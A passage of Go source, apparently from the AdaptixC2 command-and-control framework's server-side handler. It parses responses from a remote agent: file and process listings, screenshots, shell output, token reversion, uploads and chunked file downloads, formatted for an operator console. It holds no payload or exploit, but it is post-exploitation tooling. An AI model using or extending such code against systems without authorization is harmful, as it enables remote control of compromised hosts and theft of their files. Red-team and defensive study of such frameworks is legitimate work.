				if agentData.Os == adaptix.OS_WINDOWS {

					var items []adaptix.ListingFileDataWin

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Files []FileInfo
						err := msgpack.Unmarshal(params.Files, &Files)
						if err != nil {
							continue
						}

						filesCount := len(Files)
						if filesCount == 0 {
							task.Message = fmt.Sprintf("The '%s' directory is EMPTY", params.Path)
						} else {

							var folders []adaptix.ListingFileDataWin
							var files []adaptix.ListingFileDataWin

							for _, f := range Files {

								date := int64(0)
								t, err := time.Parse("02/01/2006 15:04", f.Date)
								if err == nil {
									date = t.Unix()
								}

								fileData := adaptix.ListingFileDataWin{
									IsDir:    f.IsDir,
									Size:     f.Size,
									Date:     date,
									Filename: f.Filename,
								}

								if f.IsDir {
									folders = append(folders, fileData)
								} else {
									files = append(files, fileData)
								}
							}

							items = append(folders, files...)

							OutputText := fmt.Sprintf(" %-8s %-14s %-20s  %s\n", "Type", "Size", "Last Modified      ", "Name")
							OutputText += fmt.Sprintf(" %-8s %-14s %-20s  %s", "----", "---------", "----------------   ", "----")

							for _, item := range items {
								t := time.Unix(item.Date, 0).UTC()
								lastWrite := fmt.Sprintf("%02d/%02d/%d %02d:%02d", t.Day(), t.Month(), t.Year(), t.Hour(), t.Minute())

								if item.IsDir {
									OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "dir", "", lastWrite, item.Filename)
								} else {
									OutputText += fmt.Sprintf("\n %-8s %-14s %-20s  %-8v", "", SizeBytesToFormat(item.Size), lastWrite, item.Filename)
								}
							}
							task.Message = fmt.Sprintf("List of files in the '%s' directory", params.Path)
							task.ClearText = OutputText

						}
					}
					Ts.TsClientGuiFilesWindows(task, params.Path, items)

				} else {

					var items []adaptix.ListingFileDataUnix

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Files []FileInfo
						err := msgpack.Unmarshal(params.Files, &Files)
						if err != nil {
							continue
						}

						filesCount := len(Files)
						if filesCount == 0 {
							task.Message = fmt.Sprintf("The '%s' directory is EMPTY", params.Path)
						} else {

							modeFsize := 1
							lnkFsize := 1
							userFsize := 1
							groupFsize := 1
							sizeFsize := 1
							dateFsize := 1

							for _, f := range Files {
								val := fmt.Sprintf("%d", f.Nlink)
								if len(val) > lnkFsize {
									lnkFsize = len(val)
								}
								val = fmt.Sprintf("%d", f.Size)
								if len(val) > sizeFsize {
									sizeFsize = len(val)
								}
								if len(f.Mode) > modeFsize {
									modeFsize = len(f.Mode)
								}
								if len(f.User) > userFsize {
									userFsize = len(f.User)
								}
								if len(f.Group) > groupFsize {
									groupFsize = len(f.Group)
								}
								if len(f.Date) > dateFsize {
									dateFsize = len(f.Date)
								}
							}

							format2 := fmt.Sprintf(" %%-%ds %%-%dd %%-%ds %%-%ds %%-%dd %%-%ds %%s", modeFsize, lnkFsize, userFsize, groupFsize, sizeFsize, dateFsize)
							OutputText := ""
							for _, fi := range Files {
								OutputText += fmt.Sprintf("\n"+format2, fi.Mode, fi.Nlink, fi.User, fi.Group, fi.Size, fi.Date, fi.Filename)

								fileData := adaptix.ListingFileDataUnix{
									IsDir:    fi.IsDir,
									Mode:     fi.Mode,
									User:     fi.User,
									Group:    fi.Group,
									Size:     fi.Size,
									Date:     fi.Date,
									Filename: fi.Filename,
								}

								items = append(items, fileData)
							}

							task.Message = fmt.Sprintf("List of files in the '%s' directory", params.Path)
							task.ClearText = OutputText
						}
					}
					Ts.TsClientGuiFilesUnix(task, params.Path, items)
				}

			case COMMAND_MKDIR:
				task.Message = "Directory created successfully"

			case COMMAND_MV:
				task.Message = "Object moved successfully"

			case COMMAND_PS:
				var params AnsPs
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				if agentData.Os == adaptix.OS_WINDOWS {

					var proclist []adaptix.ListingProcessDataWin

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Processes []PsInfo
						err := msgpack.Unmarshal(params.Processes, &Processes)
						if err != nil {
							continue
						}

						procCount := len(Processes)
						if procCount == 0 {
							task.Message = "Failed to get process list"
							task.MessageType = adaptix.MESSAGE_ERROR
							break
						} else {

							contextMaxSize := 10

							for _, p := range Processes {

								sessId, err := strconv.Atoi(p.Tty)
								if err != nil {
									sessId = 0
								}

								procData := adaptix.ListingProcessDataWin{
									Pid:         uint(p.Pid),
									Ppid:        uint(p.Ppid),
									SessionId:   uint(sessId),
									Arch:        "",
									Context:     p.Context,
									ProcessName: p.Process,
								}

								if len(procData.Context) > contextMaxSize {
									contextMaxSize = len(procData.Context)
								}

								proclist = append(proclist, procData)
							}

							type TreeProc struct {
								Data     adaptix.ListingProcessDataWin
								Children []*TreeProc
							}

							procMap := make(map[uint]*TreeProc)
							var roots []*TreeProc

							for _, proc := range proclist {
								node := &TreeProc{Data: proc}
								procMap[proc.Pid] = node
							}

							for _, node := range procMap {
								if node.Data.Ppid == 0 || node.Data.Pid == node.Data.Ppid {
									roots = append(roots, node)
								} else if parent, ok := procMap[node.Data.Ppid]; ok {
									parent.Children = append(parent.Children, node)
								} else {
									roots = append(roots, node)
								}
							}

							sort.Slice(roots, func(i, j int) bool {
								return roots[i].Data.Pid < roots[j].Data.Pid
							})

							var sortChildren func(node *TreeProc)
							sortChildren = func(node *TreeProc) {
								sort.Slice(node.Children, func(i, j int) bool {
									return node.Children[i].Data.Pid < node.Children[j].Data.Pid
								})
								for _, child := range node.Children {
									sortChildren(child)
								}
							}
							for _, root := range roots {
								sortChildren(root)
							}

							format := fmt.Sprintf(" %%-5v   %%-5v   %%-7v   %%-5v   %%-%vv   %%v", contextMaxSize)
							OutputText := fmt.Sprintf(format, "PID", "PPID", "Session", "Arch", "Context", "Process")
							OutputText += fmt.Sprintf("\n"+format, "---", "----", "-------", "----", "-------", "-------")

							var lines []string

							var formatTree func(node *TreeProc, prefix string, isLast bool)
							formatTree = func(node *TreeProc, prefix string, isLast bool) {
								branch := "├─ "
								if isLast {
									branch = "└─ "
								}
								treePrefix := prefix + branch
								data := node.Data

								line := fmt.Sprintf(format, data.Pid, data.Ppid, data.SessionId, data.Arch, data.Context, treePrefix+data.ProcessName)
								lines = append(lines, line)

								childPrefix := prefix
								if isLast {
									childPrefix += "    "
								} else {
									childPrefix += "│   "
								}

								for i, child := range node.Children {
									formatTree(child, childPrefix, i == len(node.Children)-1)
								}
							}

							for i, root := range roots {
								formatTree(root, "", i == len(roots)-1)
							}

							OutputText += "\n" + strings.Join(lines, "\n")
							task.Message = "Process list:"
							task.ClearText = OutputText
						}
					}
					Ts.TsClientGuiProcessWindows(task, proclist)

				} else {

					var proclist []adaptix.ListingProcessDataUnix

					if !params.Result {
						task.Message = params.Status
						task.MessageType = adaptix.MESSAGE_ERROR
					} else {
						var Processes []PsInfo
						err := msgpack.Unmarshal(params.Processes, &Processes)
						if err != nil {
							continue
						}

						procCount := len(Processes)
						if procCount == 0 {
							task.Message = "Failed to get process list"
							task.MessageType = adaptix.MESSAGE_ERROR
							break
						} else {
							pidFsize := 3
							ppidFsize := 4
							ttyFsize := 3
							contextFsize := 7

							for _, p := range Processes {
								val := fmt.Sprintf("%d", p.Pid)
								if len(val) > pidFsize {
									pidFsize = len(val)
								}
								val = fmt.Sprintf("%d", p.Ppid)
								if len(val) > ppidFsize {
									ppidFsize = len(val)
								}
								if len(p.Tty) > ttyFsize {
									ttyFsize = len(p.Tty)
								}
								if len(p.Context) > contextFsize {
									contextFsize = len(p.Context)
								}

								processData := adaptix.ListingProcessDataUnix{
									Pid:         uint(p.Pid),
									Ppid:        uint(p.Ppid),
									TTY:         p.Tty,
									Context:     p.Context,
									ProcessName: p.Process,
								}

								proclist = append(proclist, processData)
							}

							type TreeProc struct {
								Data     adaptix.ListingProcessDataUnix
								Children []*TreeProc
							}

							procMap := make(map[uint]*TreeProc)
							var roots []*TreeProc

							for _, proc := range proclist {
								node := &TreeProc{Data: proc}
								procMap[proc.Pid] = node
							}

							for _, node := range procMap {
								if node.Data.Ppid == 0 || node.Data.Pid == node.Data.Ppid {
									roots = append(roots, node)
								} else if parent, ok := procMap[node.Data.Ppid]; ok {
									parent.Children = append(parent.Children, node)
								} else {
									roots = append(roots, node)
								}
							}

							sort.Slice(roots, func(i, j int) bool {
								return roots[i].Data.Pid < roots[j].Data.Pid
							})

							var sortChildren func(node *TreeProc)
							sortChildren = func(node *TreeProc) {
								sort.Slice(node.Children, func(i, j int) bool {
									return node.Children[i].Data.Pid < node.Children[j].Data.Pid
								})
								for _, child := range node.Children {
									sortChildren(child)
								}
							}
							for _, root := range roots {
								sortChildren(root)
							}

							format := fmt.Sprintf(" %%-%dv   %%-%dv   %%-%dv   %%-%dv   %%v", pidFsize, ppidFsize, ttyFsize, contextFsize)
							OutputText := fmt.Sprintf(format, "PID", "PPID", "TTY", "Context", "CommandLine")
							OutputText += fmt.Sprintf("\n"+format, "---", "----", "---", "-------", "-----------")

							var lines []string

							var formatTree func(node *TreeProc, prefix string, isLast bool)
							formatTree = func(node *TreeProc, prefix string, isLast bool) {
								branch := "├─ "
								if isLast {
									branch = "└─ "
								}
								treePrefix := prefix + branch
								data := node.Data

								line := fmt.Sprintf(format, data.Pid, data.Ppid, data.TTY, data.Context, treePrefix+data.ProcessName)
								lines = append(lines, line)

								childPrefix := prefix
								if isLast {
									childPrefix += "    "
								} else {
									childPrefix += "│   "
								}

								for i, child := range node.Children {
									formatTree(child, childPrefix, i == len(node.Children)-1)
								}
							}

							for i, root := range roots {
								formatTree(root, "", i == len(roots)-1)
							}

							OutputText += "\n" + strings.Join(lines, "\n")
							task.Message = "Process list:"
							task.ClearText = OutputText
						}
					}
					Ts.TsClientGuiProcessUnix(task, proclist)
				}

			case COMMAND_KILL:
				task.Message = "Process killed"

			case COMMAND_PWD:
				var params AnsPwd
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = "Current working directory:"
				task.ClearText = params.Path

			case COMMAND_SCREENSHOT:
				var params AnsScreenshots
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				count := 0
				if params.Screens != nil {
					count = len(params.Screens)
					if count == 1 {
						_ = Ts.TsScreenshotAdd(agentData.Id, "", params.Screens[0])
					} else {
						for num, screen := range params.Screens {
							_ = Ts.TsScreenshotAdd(agentData.Id, fmt.Sprintf("Monitor %d", num), screen)
						}
					}
				}
				task.Message = fmt.Sprintf("%d screenshots saved", count)

			case COMMAND_SHELL:
				var params AnsShell
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}

				task.Message = "Command output:"
				if agentData.Os == adaptix.OS_WINDOWS {
					task.ClearText = Ts.TsConvertCpToUTF8(params.Output, agentData.OemCP)
				} else {
					task.ClearText = params.Output
				}

			case COMMAND_REV2SELF:
				task.Message = "Token reverted successfully"
				emptyImpersonate := ""
				_ = Ts.TsAgentUpdateDataPartial(agentData.Id, struct {
					Impersonated *string `json:"impersonated"`
				}{Impersonated: &emptyImpersonate})

			case COMMAND_RM:
				task.Message = "Object deleted successfully"

			case COMMAND_UPLOAD:
				var params AnsUpload
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("File '%s' successfully uploaded", params.Path)
				Ts.TsClientGuiFilesStatus(task)

			case COMMAND_ZIP:
				var params AnsZip
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("Archive '%s' successfully created", params.Path)
				task.MessageType = adaptix.MESSAGE_SUCCESS

			case COMMAND_ERROR:
				var params AnsError
				err := msgpack.Unmarshal(cmd.Data, &params)
				if err != nil {
					continue
				}
				task.Message = fmt.Sprintf("Error %s", params.Error)
				task.MessageType = adaptix.MESSAGE_ERROR

			default:
				continue
			}

			outTasks = append(outTasks, task)
		}

	} else if inMessage.Type == 2 {

		if len(inMessage.Object) == 1 {
			err = msgpack.Unmarshal(inMessage.Object[0], &job)
			if err != nil {
				goto HANDLER
			}

			task := taskData
			task.TaskId = job.JobId

			switch job.CommandId {

			case COMMAND_DOWNLOAD:

				var params AnsDownload
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					goto HANDLER
				}
				fileId := fmt.Sprintf("%08x", params.FileId)

				if params.Start {
					task.Message = fmt.Sprintf("The download of the '%s' file (%v bytes) has started: [fid %v]", params.Path, params.Size, fileId)
					_ = Ts.TsDownloadAdd(agentData.Id, fileId, params.Path, params.Size)
				}

				_ = Ts.TsDownloadUpdate(fileId, 1, params.Content)

				if params.Finish {
					task.Completed = true

					if params.Canceled {
						task.Message = fmt.Sprintf("Download '%v' successful canceled", fileId)
						_ = Ts.TsDownloadClose(fileId, 4)
					} else {
						task.Message = fmt.Sprintf("File download complete: [fid %v]", fileId)
						_ = Ts.TsDownloadClose(fileId, 3)
					}
				} else {
					goto HANDLER
				}

			case COMMAND_RUN:

				var params AnsRun
				err := msgpack.Unmarshal(job.Data, &params)
				if err != nil {
					goto HANDLER
				}

				task.Completed = false

				if params.Start {
					task.Message = fmt.Sprintf("Run process [%v] with pid '%v'", task.TaskId, params.Pid)
				}

				if agentData.Os == adaptix.OS_WINDOWS {
					task.ClearText = Ts.TsConvertCpToUTF8(params.Stdout, agentData.OemCP)
				} else {
					task.ClearText = params.Stdout
				}

				if params.Stderr != "" {
					errorStr := params.Stderr
					if agentData.Os == adaptix.OS_WINDOWS {
						errorStr = Ts.TsConvertCpToUTF8(params.Stderr, agentData.OemCP)
					}
					task.ClearText += fmt.Sprintf("\n --- [error] --- \n%v ", errorStr)
				}

				if params.Finish {
					task.Message = fmt.Sprintf("Process [%v] with pid '%v' finished", task.TaskId, params.Pid)
					task.Completed = true
				}

			default:
				goto HANDLER
			}

			outTasks = append(outTasks, task)
		}
	}

HANDLER:

	/// END CODE

	for _, task := range outTasks {
		Ts.TsTaskUpdate(agentData.Id, task)
	}

	return nil
}
